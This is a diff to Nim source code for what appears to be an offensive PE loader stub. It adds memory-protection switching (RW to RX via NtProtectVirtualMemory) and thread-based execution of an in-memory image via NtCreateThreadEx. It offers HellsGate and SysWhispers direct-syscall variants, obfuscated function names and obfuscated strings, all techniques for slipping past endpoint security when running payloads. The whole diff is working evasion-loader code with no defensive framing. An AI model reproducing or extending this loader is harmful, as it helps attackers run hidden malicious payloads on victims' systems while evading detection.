@@ -240,10 +240,18 @@ let PELoadStub * = """
             else:
                 when defined(verbose):
                   echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
+        var protectionValue: DWORD = PAGE_EXECUTE_READWRITE
+
+        when defined(RX):
+          protectionValue = PAGE_READWRITE
+        when defined(RWX):
+          protectionValue = PAGE_EXECUTE_READWRITE
+        
+
         when defined(SysWhispers):
-            status = oqiahsjynmxkla(curProcHandle, &preferAddr, 0, &allocsize,MEM_COMMIT or MEM_RESERVE,PAGE_EXECUTE_READWRITE)
+            status = oqiahsjynmxkla(curProcHandle, &preferAddr, 0, &allocsize,MEM_COMMIT or MEM_RESERVE,protectionValue)
         else:
-            status = NtAllocateVirtualMemory(curProcHandle, &preferAddr, 0, &allocsize,MEM_COMMIT or MEM_RESERVE,PAGE_EXECUTE_READWRITE)
+            status = NtAllocateVirtualMemory(curProcHandle, &preferAddr, 0, &allocsize,MEM_COMMIT or MEM_RESERVE,protectionValue)
         
         when defined(verbose):
           echo obf("NtAllocateVirtualMemory:")
@@ -294,11 +302,42 @@ let PELoadStub * = """
         if preferAddr != preferAddr:
           discard applyReloc(cast[ULONGLONG](preferAddr), cast[ULONGLONG](preferAddr), preferAddr,ntHeader.OptionalHeader.SizeOfImage)
         var retAddr: HANDLE = cast[HANDLE](preferAddr) + cast[HANDLE](ntHeader.OptionalHeader.AddressOfEntryPoint)
+        
+        when defined(RX):
+          when defined(HellsGate):
+            if getSyscall(ntProtectTable):
+                syscall = ntProtectTable.wSysCall
+            else:
+                when defined(verbose):
+                  echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+          
+          when defined(syswhispers):
+                status = uashdiasdj(curProcHandle,&preferAddr,&allocsize,PAGE_EXECUTE_READ,addr op)
+          else:
+              status = NtProtectVirtualMemory(curProcHandle,&preferAddr,&allocsize,PAGE_EXECUTE_READ,addr op)
+          when defined(verbose):
+            echo obf("NtProtectVirtualMemory:")
+            echo status
 
-
-    
-        let f = cast[proc(){.nimcall.}](retAddr)
-        f()
+        
+        when defined(LocalCreateThread):
+          when defined(HellsGate):
+            if getSyscall(ntCreateTable):
+                syscall = ntCreateTable.wSysCall
+            else:
+                when defined(verbose):
+                  echo obf("[-] Failed to find opcode for NtCreateThreadEx")
+          var tHandle: HANDLE
+          
+          when defined(syswhispers):
+                status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,nil,-1,retAddr,nil, FALSE, 0, 0, 0, nil)
+          else:
+              status = NtCreateThreadEx(&tHandle,THREAD_ALL_ACCESS,nil,-1,retAddr,nil, FALSE, 0, 0, 0, nil)
+          when defined(verbose):
+            echo obf("[*] NtCreateThreadEx: "), toHex(status)
+        else:
+            let f = cast[proc(){.nimcall.}](retAddr)
+            f()
 
     #[
         var 
